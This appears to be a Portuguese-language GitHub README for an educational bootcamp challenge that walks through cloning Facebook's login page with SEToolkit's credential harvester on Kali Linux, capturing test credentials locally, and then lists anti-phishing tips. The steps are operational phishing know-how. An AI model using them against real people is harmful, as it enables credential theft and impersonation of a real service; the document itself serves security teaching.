# Cria-o-de-um-Phishing-com-o-Kali-Linux
Desafio de Projeto DIO
🚀 Objetivo do Projeto
Este projeto é uma simulação de phishing usando o SEToolkit no Kali Linux. Ele foi desenvolvido como parte de um desafio educacional focado em segurança cibernética e tem como propósito ensinar a identificar e proteger sistemas contra ataques de phishing.
🛠️ Pré-requisitos
Antes de iniciar, você precisa ter:

Kali Linux instalado (pode ser em uma máquina virtual).
Permissões de root no terminal.
Conhecimentos básicos de redes e segurança.
📌 Etapas do Projeto
1. Configurando o SEToolkit
Acesse o terminal do Kali Linux e eleve as permissões para root:

bash
Copiar código
sudo su
Inicie o SEToolkit:

bash
Copiar código
setoolkit
Selecione as seguintes opções no menu interativo:

1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
2. Configurando o Phishing Local
Obtenha o endereço IP local da sua máquina:

bash
Copiar código
ifconfig
Insira o IP no SEToolkit quando solicitado (exemplo: 192.168.0.105).

Digite a URL do site que será clonado:

bash
Copiar código
http://www.facebook.com
O SEToolkit irá clonar o site e criar um servidor local com a página falsa.

3. Testando o Ambiente
No navegador da mesma rede, acesse o IP da máquina no formato:

bash
Copiar código
http://192.168.0.105
Insira informações fictícias na página falsa.

Os dados coletados ficarão armazenados no diretório:

bash
Copiar código
/var/www/html/
Acesse e visualize as credenciais capturadas:

bash
Copiar código
cat /var/www/html/harvester.txt
🔍 Análise e Resultados
As credenciais inseridas na página falsa aparecem no arquivo harvester.txt. Este processo demonstra como ataques de phishing funcionam, permitindo que você entenda e identifique ameaças reais.

🛡️ Boas Práticas de Segurança
Aqui estão dicas para evitar ataques de phishing:

Verificar o URL: Sites falsos têm URLs estranhas ou incompletas.
Certificado SSL: Verifique se a conexão é segura (HTTPS).
Autenticação em Dois Fatores (2FA): Ative sempre que possível.
Extensões Anti-Phishing: Use ferramentas como Netcraft Anti-Phishing ou Google Safe Browsing.
🎯 Conclusão
Este projeto demonstra o funcionamento básico de ataques de phishing e reforça a importância de:

Educar usuários sobre segurança cibernética.
Implementar práticas de defesa para proteger sistemas reais.
📂 Estrutura do Repositório
plaintext
Copiar código
📂 phishing-simulacao
│── README.md        <- Documentação do projeto
│── /screenshots     <- Capturas de tela da simulação
└── /results         <- Logs e arquivos de exemplo
🧑‍💻 Tecnologias Utilizadas
Kali Linux: Sistema operacional focado em segurança.
SEToolkit: Ferramenta para engenharia social.
Bash/Linux: Comandos básicos no terminal.
